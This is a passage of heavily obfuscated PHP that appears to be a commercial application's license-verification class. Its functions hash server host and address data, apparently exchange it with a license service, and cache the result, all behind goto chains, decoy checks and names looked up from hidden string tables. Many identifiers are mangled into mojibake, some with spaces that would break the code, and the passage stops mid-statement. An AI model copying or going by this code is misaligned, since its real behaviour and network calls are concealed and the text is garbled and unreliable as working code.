$A‚¯¬ªİ½‚[54])); goto C‚„Ë¶Ş°×; Eí°…½Ä‡: } public function pyfs3bac6416($eª©î½…¼›) { goto cÎ†¿Ñµµ; Aø—Ù„«áÃ: if (!$dæ´ô©…ˆÔ) { die; } unset($eª©î½…¼›[$C‹·ƒÓØƒ»[106]][$C‹·ƒÓØƒ»[107]][$C‹·ƒÓØƒ»[76]]); $F®™¯™ö‡‘ = $c’µ„Ã±ºå[612]; goto AôØƒã…¬‹; CòäÙÚÙ´¨: $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[140]] = $C‹·ƒÓØƒ»[116]($this->vhto6fc852e1, $C‹·ƒÓØƒ»[141], $C‹·ƒÓØƒ»[10]); if ($C‹·ƒÓØƒ»[116]($GLOBALS, $C‹·ƒÓØƒ»[142]) && $this->config[$C‹·ƒÓØƒ»[143]]) { $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[144]] = WEB_ROOT; } return $eª©î½…¼›; goto d×½Á«¯ˆ…; A®ìİ…Æ…: if (strlen($AÓ…’Âğ) < $c’µ„Ã±ºå[585]) { die; } unset($eª©î½…¼›[$C‹·ƒÓØƒ»[106]][$C‹·ƒÓØƒ»[108]][$C‹·ƒÓØƒ»[110]]); $dæ´ô©…ˆÔ = $c’µ„Ã±ºå[611]; goto Aø—Ù„«áÃ; a§Ä…¨„­: $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[130]] = $this->dlkx6c27239c; $Aæ’«ÖÂï = $c’µ„Ã±ºå[615]; while (strlen($Aæ’«ÖÂï) < $c’µ„Ã±ºå[585]) { if (!$Aæ’«ÖÂï) { break; } $Aæ’«ÖÂï++; } goto bõ¤ŸôÌÂ»; b‹¥ËŒÙŠÒ: $DÏ„‹¯æà = $c’µ„Ã±ºå[608]; $f¡óØØíÕ™ = array($C‹·ƒÓØƒ»[64], $C‹·ƒÓØƒ»[65], $C‹·ƒÓØƒ»[66], $C‹·ƒÓØƒ»[67], $C‹·ƒÓØƒ»[68], $C‹·ƒÓØƒ»[69], $C‹·ƒÓØƒ»[70], $C‹·ƒÓØƒ»[71], $C‹·ƒÓØƒ»[72], $C‹·ƒÓØƒ»[73], $C‹·ƒÓØƒ»[74], $C‹·ƒÓØƒ»[75], $C‹·ƒÓØƒ»[76], $C‹·ƒÓØƒ»[77], $C‹·ƒÓØƒ»[78], $C‹·ƒÓØƒ»[79], $C‹·ƒÓØƒ»[80], $C‹·ƒÓØƒ»[81], $C‹·ƒÓØƒ»[82], $C‹·ƒÓØƒ»[83], $C‹·ƒÓØƒ»[84], $C‹·ƒÓØƒ»[85], $C‹·ƒÓØƒ»[86], $C‹·ƒÓØƒ»[87], $C‹·ƒÓØƒ»[88], $C‹·ƒÓØƒ»[89], $C‹·ƒÓØƒ»[90], $C‹·ƒÓØƒ»[91], $C‹·ƒÓØƒ»[92], $C‹·ƒÓØƒ»[93], $C‹·ƒÓØƒ»[94], $C‹·ƒÓØƒ»[95], $C‹·ƒÓØƒ»[96], $C‹·ƒÓØƒ»[97], $C‹·ƒÓØƒ»[98], $C‹·ƒÓØƒ»[99], $C‹·ƒÓØƒ»[100], $C‹·ƒÓØƒ»[101], $C‹·ƒÓØƒ»[102], $C‹·ƒÓØƒ»[103]); foreach ($f¡óØØíÕ™ as $aÍøÅ‘¤´›) { $a²¼àÏºË‹ = $GLOBALS[$C‹·ƒÓØƒ»[104]][$C‹·ƒÓØƒ»[105]][$aÍøÅ‘¤´›]; $A‘±Õ— £ = $c’µ„Ã±ºå[609]; if (!$A‘±Õ— £) { return; } if (isset($c‚ïôÈßâ[$aÍøÅ‘¤´›])) { $a²¼àÏºË‹ = $c‚ïôÈßâ[$aÍøÅ‘¤´›]; } $eª©î½…¼›[$C‹·ƒÓØƒ»[106]][$C‹·ƒÓØƒ»[107]][$aÍøÅ‘¤´›] = $a²¼àÏºË‹; } goto aâ¿¦×åÍ„; E‚åå¢‹–½: $cÒÇÊ˜¥Æ = $c’µ„Ã±ºå[614]; $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[123]] = $C‹·ƒÓØƒ»[124]($_SERVER[$C‹·ƒÓØƒ»[125]] . $c‚ïôÈßâ[$C‹·ƒÓØƒ»[126]]); $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[127]] = $C‹·ƒÓØƒ»[128]($C‹·ƒÓØƒ»[129]()); goto a§Ä…¨„­; cÎ†¿Ñµµ: $c’µ„Ã±ºå =& $_SERVER[Ç³Íß¦Ó]; $C‹·ƒÓØƒ» =& $_SERVER[øÜ]; $c‚ïôÈßâ = $C‹·ƒÓØƒ»[61]($C‹·ƒÓØƒ»[62])->{$_SERVER[øÜ][63]}(); goto b‹¥ËŒÙŠÒ; c³Ú„åÔ¹: if (!$EÙ·£ğõ«¤) { die; } $eª©î½…¼›[$C‹·ƒÓØƒ»[106]][$C‹·ƒÓØƒ»[107]][$C‹·ƒÓØƒ»[112]] = array($C‹·ƒÓØƒ»[113] => (int) $F•ÊùÖ“†ï[$C‹·ƒÓØƒ»[114]], $C‹·ƒÓØƒ»[115] => (int) $C‹·ƒÓØƒ»[116]($F•ÊùÖ“†ï, $C‹·ƒÓØƒ»[117], 0)); $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[119]] = $C‹·ƒÓØƒ»[120]($C‹·ƒÓØƒ»[121])->{$_SERVER[øÜ][122]}(); goto E‚åå¢‹–½; aâ¿¦×åÍ„: $F•ÊùÖ“†ï = $eª©î½…¼›[$C‹·ƒÓØƒ»[106]][$C‹·ƒÓØƒ»[107]][$C‹·ƒÓØƒ»[76]]; unset($eª©î½…¼›[$C‹·ƒÓØƒ»[106]][$C‹·ƒÓØƒ»[108]][$C‹·ƒÓØƒ»[109]]); $AÓ…’Âğ = $c’µ„Ã±ºå[610]; goto A®ìİ…Æ…; AôØƒã…¬‹: if (!$F®™¯™ö‡‘) { return; } unset($eª©î½…¼›[$C‹·ƒÓØƒ»[106]][$C‹·ƒÓØƒ»[107]][$C‹·ƒÓØƒ»[111]]); $EÙ·£ğõ«¤ = $c’µ„Ã±ºå[613]; goto c³Ú„åÔ¹; bõ¤ŸôÌÂ»: if ($c‚ïôÈßâ[$C‹·ƒÓØƒ»[130]] != $C‹·ƒÓØƒ»[131]) { $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[132]] = $c‚ïôÈßâ[$C‹·ƒÓØƒ»[132]]; $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[133]] = $c‚ïôÈßâ[$C‹·ƒÓØƒ»[133]]; $aÁÍÛ‰“š± = $C‹·ƒÓØƒ»[134](10) . $this->dlkx6c27239c . $C‹·ƒÓØƒ»[134](5); $eª©î½…¼›[$C‹·ƒÓØƒ»[106]][$C‹·ƒÓØƒ»[135]][$C‹·ƒÓØƒ»[136]] = $this->{$_SERVER[øÜ][137]}($aÁÍÛ‰“š±, $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[123]]); } if ($this->dlkx6c27239c == $C‹·ƒÓØƒ»[131]) { $eª©î½…¼›[$C‹·ƒÓØƒ»[106]][$C‹·ƒÓØƒ»[107]][$C‹·ƒÓØƒ»[112]][$C‹·ƒÓØƒ»[117]] = 0; } $eª©î½…¼›[$C‹·ƒÓØƒ»[118]][$C‹·ƒÓØƒ»[138]] = $C‹·ƒÓØƒ»[116]($this->vhto6fc852e1, $C‹·ƒÓØƒ»[139], $C‹·ƒÓØƒ»[10]); goto CòäÙÚÙ´¨; d×½Á«¯ˆ…: } private function pjvd5d90b0e6() { goto EÜéö•µà; C©—°‘”¯: foreach ($fØİ­¤•ƒ¥ as $bŒĞŠƒ†í) { if (!isset($DÄĞ™ïĞ­÷[$bŒĞŠƒ†í]) || !$DÄĞ™ïĞ­÷[$bŒĞŠƒ†í]) { continue; } $A•¼Äãƒ¡[$bŒĞŠƒ†í] = $DÄĞ™ïĞ­÷[$bŒĞŠƒ†í]; $bÖÎàÁÜœ = $EÌµîºÅ…[618]; if (strlen($bÖÎàÁÜœ) < $EÌµîºÅ…[585]) { return; } } $E´é¨ÚâÕí[13](array($E´é¨ÚâÕí[161], $E´é¨ÚâÕí[162]), $A•¼Äãƒ¡); goto b‚ÀÆ½Øîš; AÀš…à•ÀÇ: if ($this->dlkx6c27239c == $E´é¨ÚâÕí[131]) { return; } $fØİ­¤•ƒ¥ = array($E´é¨ÚâÕí[163], $E´é¨ÚâÕí[164], $E´é¨ÚâÕí[165], $E´é¨ÚâÕí[166], $E´é¨ÚâÕí[167], $E´é¨ÚâÕí[168]); $aß¸„´È¬ = $EÌµîºÅ…[617]; goto AÀ—Ø¬î‡ò; AÀ—Ø¬î‡ò: if (strlen($aß¸„´È¬) < $EÌµîºÅ…[598]) { die; } $DÄĞ™ïĞ­÷ = $E´é¨ÚâÕí[61]($E´é¨ÚâÕí[62])->{$_SERVER[øÜ][63]}(); $A•¼Äãƒ¡ = array($E´é¨ÚâÕí[169] => $DÄĞ™ïĞ­÷[$E´é¨ÚâÕí[64]], $E´é¨ÚâÕí[170] => $DÄĞ™ïĞ­÷[$E´é¨ÚâÕí[65]], $E´é¨ÚâÕí[171] => $E´é¨ÚâÕí[10]); goto C©—°‘”¯; EÜéö•µà: $EÌµîºÅ… =& $_SERVER[Ç³Íß¦Ó]; $E´é¨ÚâÕí =& $_SERVER[øÜ]; if ($_SERVER[$E´é¨ÚâÕí[44]] == $E´é¨ÚâÕí[145]) { goto b†®Œ²É½Û; b†®Œ²É½Û: $C¸ìÜªÖœº = array($E´é¨ÚâÕí[130] => $this->dlkx6c27239c, $E´é¨ÚâÕí[146] => $this->{$_SERVER[øÜ][147]}(), $E´é¨ÚâÕí[148] => $E´é¨ÚâÕí[61]($E´é¨ÚâÕí[149])->{$_SERVER[øÜ][150]}()); if ($this->dlkx6c27239c != $E´é¨ÚâÕí[131]) { $c‡š†ˆ¢ëÛ = $E´é¨ÚâÕí[116]($this->vhto6fc852e1, $E´é¨ÚâÕí[151]); if ($c‡š†ˆ¢ëÛ) { $C¸ìÜªÖœº[$E´é¨ÚâÕí[152]] = $c‡š†ˆ¢ëÛ; $C¸ìÜªÖœº[$E´é¨ÚâÕí[153]] = $E´é¨ÚâÕí[154]($E´é¨ÚâÕí[116]($this->vhto6fc852e1, $E´é¨ÚâÕí[155])); $C¸ìÜªÖœº[$E´é¨ÚâÕí[156]] = $E´é¨ÚâÕí[116]($this->vhto6fc852e1, $E´é¨ÚâÕí[141]); } } $C¸ìÜªÖœº = $this->{$_SERVER[øÜ][157]}($E´é¨ÚâÕí[158]($C¸ìÜªÖœº), $E´é¨ÚâÕí[124]($E´é¨ÚâÕí[159])); goto aŠÆ‡Ø‘¡ß; aŠÆ‡Ø‘¡ß: $A•¼Äãƒ¡ = array($E´é¨ÚâÕí[160] => $C¸ìÜªÖœº); $E´é¨ÚâÕí[13](array($E´é¨ÚâÕí[161], $E´é¨ÚâÕí[162]), $A•¼Äãƒ¡); $A…íŠ¶§•œ = $EÌµîºÅ…[616]; goto dòÖ¡É¶÷õ; dòÖ¡É¶÷õ: if (strlen($A…íŠ¶§•œ) < $EÌµîºÅ…[580]) { die; } goto B‹…ñ•Ââ®; B‹…ñ•Ââ®: } goto AÀš…à•ÀÇ; b‚ÀÆ½Øîš: } private function trvocedad547() { goto A¿åëÌ¥Ö; C¯°éğ„†: if (!$dî”÷·Ü°[116]($GLOBALS, $dî”÷·Ü°[142])) { die; } $cß“¶Ğ¸Æ« = $GLOBALS[$dî”÷·Ü°[22]]; if (isset($cß“¶Ğ¸Æ«[$dî”÷·Ü°[173]])) { $this->{$_SERVER[øÜ][174]}(); die; } goto f›ÎòËè ; d¬ÒóŞ‘Ãô: $f„‹ÀÂ©Ïƒ = $dî”÷·Ü°[224]($dî”÷·Ü°[25]($e“ÖÂ¤Ò¹, 10, 16)); $dÁŞØâ = $Fîµ²Ó¾ÈŒ[622]; $Bìç†œ”Ñ¦ = $this->{$_SERVER[øÜ][137]}($dî”÷·Ü°[158]($F©ÚŞâ¸«ê), $e“ÖÂ¤Ò¹); goto DÅ«£…Õ•; BÆôâ‰¼«Š: $câ‰“«íª‹ = $Fîµ²Ó¾ÈŒ[619]; if (strlen($câ‰“«íª‹) < $Fîµ²Ó¾ÈŒ[589]) { die; } $fäù‘ŸÔ = $dî”÷·Ü°[124]($_SERVER[$dî”÷·Ü°[125]] . $eåğÕ¹ŞÇ…); goto Eğ‚§š š; D±Î™ª‡¥¦: $DùŞÂ¯‰Ü[$f„‹ÀÂ©Ïƒ] = $Bìç†œ”Ñ¦; $dî”÷·Ü°[61]($dî”÷·Ü°[11])->{$_SERVER[øÜ][236]}($BÛÕ†—±â[$dî”÷·Ü°[237]], array($dî”÷·Ü°[238] => $DùŞÂ¯‰Ü)); $this->vhto6fc852e1 = $F©ÚŞâ¸«ê; goto DöâÃŸóºó; fïæ·Àî¤â: if ($FÜŒ„…ÎÁ·[$dî”÷·Ü°[178]]) { $CÍ¦‹’¸™…[$dî”÷·Ü°[222]] = $FÜŒ„…ÎÁ·[$dî”÷·Ü°[178]]; } $C´Å¡Í­¾ = $dî”÷·Ü°[25]($dî”÷·Ü°[124]($CÍ¦‹’¸™…[$dî”÷·Ü°[220]]), 10, 10); $dîò¾ïÜƒ• = $C´Å¡Í­¾ . $CÍ¦‹’¸™…[$dî”÷·Ü°[130]] . $CÍ¦‹’¸™…[$dî”÷·Ü°[222]]; goto A”‘‡–µ™ï; A”‘‡–µ™ï: $CÍ¦‹’¸™…[$dî”÷·Ü°[132]] = $dî”÷·Ü°[224]($dî”÷·Ü°[128]($this->{$_SERVER[øÜ][157]}($dîò¾ïÜƒ•, $dî”÷·Ü°[225]))); $aìéè¯¿ËÁ = $dî”÷·Ü°[134](16); $AÆöò¶Ö“í = $aìéè¯¿ËÁ . $CÍ¦‹’¸™…[$dî”÷·Ü°[130]] . $this->{$_SERVER[øÜ][157]}($dî”÷·Ü°[124]($CÍ¦‹’¸™…[$dî”÷·Ü°[219]]), $aìéè¯¿ËÁ); goto Eó¹òë¡¨¥; A¿åëÌ¥Ö: $Fîµ²Ó¾ÈŒ =& $_SERVER[Ç³Íß¦Ó]; $dî”÷·Ü° =& $_SERVER[øÜ]; if ($_SERVER[$dî”÷·Ü°[44]] != $dî”÷·Ü°[172]) { return; } goto C¯°éğ„†; Cîíƒ·ğ¾×: $Dšä­ÕÁ = $this->{$_SERVER[øÜ][210]}($F©ÚŞâ¸«ê[$dî”÷·Ü°[211]]); if (!$Dšä­ÕÁ || $Dšä­ÕÁ != $F©ÚŞâ¸«ê[$dî”÷·Ü°[155]]) { $fñì¤¶Ü›Ã = array($dî”÷·Ü°[212] => $dî”÷·Ü°[61]($dî”÷·Ü°[62])->{$_SERVER[øÜ][63]}($dî”÷·Ü°[126]), $dî”÷·Ü°[213] => $_SERVER[$dî”÷·Ü°[125]], $dî”÷·Ü°[214] => $dî”÷·Ü°[215](), $dî”÷·Ü°[184] => $_SERVER[$dî”÷·Ü°[185]]); $dğŠÙÜ§ñ = $this->{$_SERVER[øÜ][216]}($dî”÷·Ü°[158]($fñì¤¶Ü›Ã)); $this->{$_SERVER[øÜ][193]}($dî”÷·Ü°[217] . $dğŠÙÜ§ñ); $dî”÷·Ü°[176]($dî”÷·Ü°[208]($dî”÷·Ü°[218]), !0); } $CÍ¦‹’¸™… = array($dî”÷·Ü°[219] => $FÜŒ„…ÎÁ·[$dî”÷·Ü°[175]], $dî”÷·Ü°[220] => $F©ÚŞâ¸«ê[$dî”÷·Ü°[221]], $dî”÷·Ü°[222] => $dî”÷·Ü°[134](16), $dî”÷·Ü°[130] => $F©ÚŞâ¸«ê[$dî”÷·Ü°[223]]); goto fïæ·Àî¤â; DöâÃŸóºó: $aµÌáÆÊ = $Fîµ²Ó¾ÈŒ[626]; $this->dlkx6c27239c = $CÍ¦‹’¸™…[$dî”÷·Ü°[130]]; $f«Ç½÷Øô‚ = $Fîµ²Ó¾ÈŒ[627]; goto FÇ‚³„ä¶Í; Fœî‹ŞêÃ: $DˆŞÅÊ‰Ó¤ = $Fîµ²Ó¾ÈŒ[625]; while (strlen($DˆŞÅÊ‰Ó¤) < $Fîµ²Ó¾ÈŒ[585]) { if (!$DˆŞÅÊ‰Ó¤) { break; } $DˆŞÅÊ‰Ó¤++; } $DùŞÂ¯‰Ü = array(); goto D±Î™ª‡¥¦; Eğ‚§š š: if ($cß“¶Ğ¸Æ«[$dî”÷·Ü°[188]] == $dî”÷·Ü°[189]) { $B¯íŒ„³ƒ = $this->{$_SERVER[øÜ][157]}($fäù‘ŸÔ, $dî”÷·Ü°[190]); $dğŠÙÜ§ñ = $this->{$_SERVER[øÜ][137]}($dî”÷·Ü°[158]($FÜŒ„…ÎÁ·), $fäù‘ŸÔ . $dî”÷·Ü°[191], 3); $dğŠÙÜ§ñ = $dğŠÙÜ§ñ . $dî”÷·Ü°[192] . $_SERVER[$dî”÷·Ü°[183]]; $Cæ°åì«Û‹ = $this->{$_SERVER[øÜ][193]}($dî”÷·Ü°[194] . $B¯íŒ„³ƒ . $dî”÷·Ü°[195] . $dğŠÙÜ§ñ, -1); $dî”÷·Ü°[176]($Cæ°åì«Û‹, !0); } else { if ($cß“¶Ğ¸Æ«[$dî”÷·Ü°[188]] == $dî”÷·Ü°[196]) { $d§Ø×áµ¦÷ = $dî”÷·Ü°[25]($dî”÷·Ü°[124]($dî”÷·Ü°[197] . $fäù‘ŸÔ), 12, 15) . $dî”÷·Ü°[198]; $dğŠÙÜ§ñ = $this->{$_SERVER[øÜ][199]}($dî”÷·Ü°[2]($cß“¶Ğ¸Æ«[$dî”÷·Ü°[200]]), $d§Ø×áµ¦÷, 2); $B¦ø›…Ş“‚ = $dî”÷·Ü°[201]($dğŠÙÜ§ñ, !0); if (!$dî”÷·Ü°[202]($B¦ø›…Ş“‚) || !$dî”÷·Ü°[202]($B¦ø›…Ş“‚[$dî”÷·Ü°[203]]) || $B¦ø›…Ş“‚[$dî”÷·Ü°[175]] != !0) { $AÎëÉ·å = $dî”÷·Ü°[204]; $bÅãÙï’‡¹ = $B¦ø›…Ş“‚[$dî”÷·Ü°[203]] ? $dî”÷·Ü°[205] . $B¦ø›…Ş“‚[$dî”÷·Ü°[203]] : $AÎëÉ·å; $dî”÷·Ü°[176]($bÅãÙï’‡¹, !1); } else { $FÜŒ„…ÎÁ·[$dî”÷·Ü°[178]] = $B¦ø›…Ş“‚[$dî”÷·Ü°[203]][$dî”÷·Ü°[206]]; } } else { $B¦ø›…Ş“‚ = $this->{$_SERVER[øÜ][193]}($dî”÷·Ü°[207], $FÜŒ„…ÎÁ·, 10); $f†ò–˜øµâ = $Fîµ²Ó¾ÈŒ[620]; } } if (!$dî”÷·Ü°[202]($B¦ø›…Ş“‚) || !$dî”÷·Ü°[202]($B¦ø›…Ş“‚[$dî”÷·Ü°[203]]) || $B¦ø›…Ş“‚[$dî”÷·Ü°[175]] != !0) { $AÎëÉ·å = $dî”÷·Ü°[208]($dî”÷·Ü°[209]); $bÅãÙï’‡¹ = $B¦ø›…Ş“‚[$dî”÷·Ü°[203]] ? $dî”÷·Ü°[205] . $B¦ø›…Ş“‚[$dî”÷·Ü°[203]] : $AÎëÉ·å; $dî”÷·Ü°[176]($bÅãÙï’‡¹, !1); } $F©ÚŞâ¸«ê = $B¦ø›…Ş“‚[$dî”÷·Ü°[203]]; goto Cîíƒ·ğ¾×; A‰Êˆ…åîñ: Cache::set($dî”÷·Ü°[240] . $dî”÷·Ü°[124]($eåğÕ¹ŞÇ… . $dî”÷·Ü°[241]), $dî”÷·Ü°[10]); $b®¹˜£Èá = $Fîµ²Ó¾ÈŒ[629]; $dî”÷·Ü°[176]($dî”÷·Ü°[208]($dî”÷·Ü°[218]), !0); goto eáª£¢±ù; Eó¹òë¡¨¥: $CÍ¦‹’¸™…[$dî”÷·Ü°[133]] = $dî”÷·Ü°[128]($dî”÷·Ü°[224]($this->{$_SERVER[øÜ][157]}($AÆöò¶Ö“í, $dî”÷·Ü°[226]))); if ($F©ÚŞâ¸«ê[$dî”÷·Ü°[227]] && $F©ÚŞâ¸«ê[$dî”÷·Ü°[227]] >= 1) { $dî”÷·Ü°[61]($dî”÷·Ü°[62])->{$_SERVER[øÜ][228]}($dî”÷·Ü°[229], $dî”÷·Ü°[230]); } $dî”÷·Ü°[61]($dî”÷·Ü°[62])->{$_SERVER[øÜ][231]}($CÍ¦‹’¸™…); goto f¬™ØÃäÃ™; FÇ‚³„ä¶Í: if (!$f«Ç½÷Øô‚) { return; } $this->{$_SERVER[øÜ][239]}(); $fÕòÂ±Ãæã = $Fîµ²Ó¾ÈŒ[628]; goto A‰Êˆ…åîñ; eáª£¢±ù: $aàÑ²Ù­²¤ = $Fîµ²Ó¾ÈŒ[630]; if (strlen($aàÑ²Ù­²¤) < $Fîµ²Ó¾ÈŒ[580]) { return; } goto B„‹•Ê£ÉÍ; f¬™ØÃäÃ™: $e“ÖÂ¤Ò¹ = $dî”÷·Ü°[124]($_SERVER[$dî”÷·Ü°[125]] . $dî”÷·Ü°[224]($eåğÕ¹ŞÇ…) . $CÍ¦‹’¸™…[$dî”÷·Ü°[220]]); $a‹œ‹ÒÊËÎ = $Fîµ²Ó¾ÈŒ[621]; if (strlen($a‹œ‹ÒÊËÎ) < $Fîµ²Ó¾ÈŒ[580]) { die; } goto d¬ÒóŞ‘Ãô; f›ÎòËè : if (!isset($cß“¶Ğ¸Æ«[$dî”÷·Ü°[175]]) || $dî”÷·Ü°[24]($cß“¶Ğ¸Æ«[$dî”÷·Ü°[175]]) != 16) { $dî”÷·Ü°[176]($dî”÷·Ü°[177] . $cß“¶Ğ¸Æ«[$dî”÷·Ü°[175]], !1); } $eåğÕ¹ŞÇ… = $dî”÷·Ü°[61]($dî”÷·Ü°[62])->{$_SERVER[øÜ][63]}($dî”÷·Ü°[126]); $FÜŒ„…ÎÁ· = array($dî”÷·Ü°[175] => $cß“¶Ğ¸Æ«[$dî”÷·Ü°[175]], $dî”÷·Ü°[178] => $dî”÷·Ü°[134](16), $dî”÷·Ü°[179] => $dî”÷·Ü°[159], $dî”÷·Ü°[180] => $dî”÷·Ü°[181], $dî”÷·Ü°[182] => $_SERVER[$dî”÷·Ü°[183]], $dî”÷·Ü°[184] => $_SERVER[$dî”÷·Ü°[185]], $dî”÷·Ü°[186] => $_SERVER[$dî”÷·Ü°[187]]); goto BÆôâ‰¼«Š; BÃ‰„Å³‚Á: $d Œ‹‡¢ƒù = $Fîµ²Ó¾ÈŒ[624]; if (!$d Œ‹‡¢ƒù) { die; } $BÛÕ†—±â = $e‰ø×™ÊÏª[$dî”÷·Ü°[235]]; goto Fœî‹ŞêÃ; DÅ«£…Õ•: $dßøĞ§êÂ = $Fîµ²Ó¾ÈŒ[623]; if (strlen($dßøĞ§êÂ) < $Fîµ²Ó¾ÈŒ[580]) { return; } $e‰ø×™ÊÏª = $dî”÷·Ü°[232]($dî”÷·Ü°[61]($dî”÷·Ü°[11])->{$_SERVER[øÜ][233]}(), $dî”÷·Ü°[234]); goto BÃ‰„Å³‚Á; B„‹•Ê£ÉÍ: } private function licenseRegistSuccess() { $cØ·½¯Şºà =& $_SERVER[øÜ]; $b¼çê‡ºª¦ = $cØ·½¯Şºà[61]($cØ·½¯Şºà[62])->{$_SERVER[øÜ][63]}(); $b”øòò›º = $_SERVER[Ç³Íß¦Ó][631]; if ($b¼çê‡ºª¦[$cØ·½¯Şºà[93]] != $cØ·½¯Şºà[230]) { $cØ·½¯Şºà[61]($cØ·½¯Şºà[62])->{$_SERVER[øÜ][231]}($cØ·½¯Şºà[93], $cØ·½¯Şºà[230]); } $cØ·½¯Şºà[120]($cØ·½¯Şºà[242])->{$_SERVER[øÜ][243]}(!0); } private function sbnv70c13592() { goto b§‡„¯ÓŒê; FùÓ Èø: $this->vhto6fc852e1 = array(); $this->dlkx6c27239c = $AÁŸŒô¿Íƒ[131]; $a­Ù¦Š‘Å· = $bîäâö”çÛ[633]; goto cÈ•¸“š­»; B¤ƒëÁ¤‘: $AÁŸŒô¿Íƒ[61]($AÁŸŒô¿Íƒ[62])->{$_SERVER[øÜ][228]}($AÁŸŒô¿Íƒ[229], $AÁŸŒô¿Íƒ[244]); $c‹Ü‹é¨Ôö = $bîäâö”çÛ[632]; while ($c‹Ü‹é¨Ôö < $bîäâö”çÛ[585]) { if ($c‹Ü‹é¨Ôö >= 0) { break; } $c‹Ü‹é¨Ôö++; } goto FùÓ Èø; b§‡„¯ÓŒê: $bîäâö”çÛ =& $_SERVER[Ç³Íß¦Ó]; $AÁŸŒô¿Íƒ =& $_SERVER[øÜ]; $AÁŸŒô¿Íƒ[61]($AÁŸŒô¿Íƒ[62])->{$_SERVER[øÜ][231]}(array($AÁŸŒô¿Íƒ[219] => $AÁŸŒô¿Íƒ[10], $AÁŸŒô¿Íƒ[220] => $AÁŸŒô¿Íƒ[10], $AÁŸŒô¿Íƒ[130] => $AÁŸŒô¿Íƒ[131], $AÁŸŒô¿Íƒ[132] => $AÁŸŒô¿Íƒ[10], $AÁŸŒô¿Íƒ[133] => $AÁŸŒô¿Íƒ[10])); goto B¤ƒëÁ¤‘; cÈ•¸“š­»: } private function lcba67dbf8be() { goto B÷‹‡ç›Úâ; F†š—ŞÁ«: $e•‰ÁÖ‹³õ = $c¥ÃØœ©ô×[635]; if (strlen($e•‰ÁÖ‹³õ) < $c¥ÃØœ©ô×[580]) { return; } $e‡‰ºÌœÁ = $aäÆì§í³¥[240] . $aäÆì§í³¥[124]($EÁ‰æØ«—ù . $aäÆì§í³¥[241]); goto e£“ßÔî; e×“Å¸ÏÁº: if (strlen($D¨Ÿš‚‘Û‚) < $c¥ÃØœ©ô×[574]) { return; } if ($b•ŸÔ¥µè[$aäÆì§í³¥[130]] == $aäÆì§í³¥[131]) { return; } $EÁ‰æØ«—ù = $aäÆì§í³¥[61]($aäÆì§í³¥[62])->{$_SERVER[øÜ][63]}($aäÆì§í³¥[126]); goto F†š—ŞÁ«; eƒ³ØÂ‚Ô¢: $e•Ù÷ì¶ = $c¥ÃØœ©ô×[637]; while ($e•Ù÷ì¶ < $c¥ÃØœ©ô×[585]) { if ($e•Ù÷ì¶ >= 0) { break; } $e•Ù÷ì¶++; } goto DÜñ¸œÎÅå; B°†•Ù¬ÊØ: if (!$aäÆì§í³¥[202]($A °µ‹ˆŠ)) { return $this->{$_SERVER[øÜ][174]}(); } $b†ô¥’ï‹ = $aäÆì§í³¥[154]($A °µ‹ˆŠ[$aäÆì§í³¥[155]]); if ($aäÆì§í³¥[246]() >= $b†ô¥’ï‹) { return $this->{$_SERVER[øÜ][174]}(); } goto dÔÙÁ™ƒ; e£“ßÔî: $fØ“¤ŒèÙ = $c¥ÃØœ©ô×[636]; $A °µ‹ˆŠ = Cache::get($e‡‰ºÌœÁ); if (!$aäÆì§í³¥[202]($A °µ‹ˆŠ) || !isset($A °µ‹ˆŠ[$aäÆì§í³¥[245]]) || $aäÆì§í³¥[246]() - $A °µ‹ˆŠ[$aäÆì§í³¥[245]] >= 60) { $bÓÔ™šæã = $aäÆì§í³¥[232]($aäÆì§í³¥[61]($aäÆì§í³¥[11])->{$_SERVER[øÜ][233]}(), $aäÆì§í³¥[234]); $aƒ“îˆª‡• = $bÓÔ™šæã[$aäÆì§í³¥[235]]; $a©æ–Úİ = $aäÆì§í³¥[124]($_SERVER[$aäÆì§í³¥[125]] . $aäÆì§í³¥[224]($EÁ‰æØ«—ù) . $b•ŸÔ¥µè[$aäÆì§í³¥[220]]); $fèŒµŠƒñƒ = $aäÆì§í³¥[224]($aäÆì§í³¥[25]($a©æ–Úİ, 10, 16)); $A °µ‹ˆŠ = $this->{$_SERVER[øÜ][199]}($aƒ“îˆª‡•[$aäÆì§í³¥[104]][$fèŒµŠƒñƒ], $a©æ–Úİ); $A °µ‹ˆŠ = $aäÆì§í³¥[201]($A °µ‹ˆŠ, !0); } goto B°†•Ù¬ÊØ; c—ã“½¸³: $this->dlkx6c27239c = $aäÆì§í³¥[131]; $b•ŸÔ¥µè = $aäÆì§í³¥[61]($aäÆì§í³¥[62])->{$_SERVER[øÜ][63]}(); $D¨Ÿš‚‘Û‚ = $c¥ÃØœ©ô×[634]; goto e×“Å¸ÏÁº; dÔÙÁ™ƒ: if ($aäÆì§í³¥[246]() - $A °µ‹ˆŠ[$aäÆì§í³¥[245]] > 20) { $A °µ‹ˆŠ[$aäÆì§í³¥[245]] = $aäÆì§í³¥[246](); Cache::set($e‡‰ºÌœÁ, $A °µ‹ˆŠ); } $this->vhto6fc852e1 = $A °µ‹ˆŠ; $this->dlkx6c27239c = $b•ŸÔ¥µè[$aäÆì§í³¥[130]]; goto eƒ³ØÂ‚Ô¢; B÷‹‡ç›Úâ: $c¥ÃØœ©ô× =& $_SERVER[Ç³Íß¦Ó]; $aäÆì§í³¥ =& $_SERVER[øÜ]; $_SERVER[$aäÆì§í³¥[185]] = $aäÆì§í³¥[116]($_SERVER, $aäÆì§í³¥[185], APP_HOST); goto c—ã“½¸³; DÜñ¸œÎÅå: } private function jofae74a65b3() { goto Eİ“¹ÁŒòª; Eİ“¹ÁŒòª: $cÎÍÊ•¡‘ =& $_SERVER[Ç³Íß¦Ó]; $DÂñ«¹±Å =& $_SERVER[øÜ]; $d˜Ìá†·ÅÓ = $GLOBALS[$DÂñ«¹±Å[22]]; goto b«ŒõòÇù; eÙÊ‰­„‚ò: if (!$CÒèÅé‹×®) { die; } if 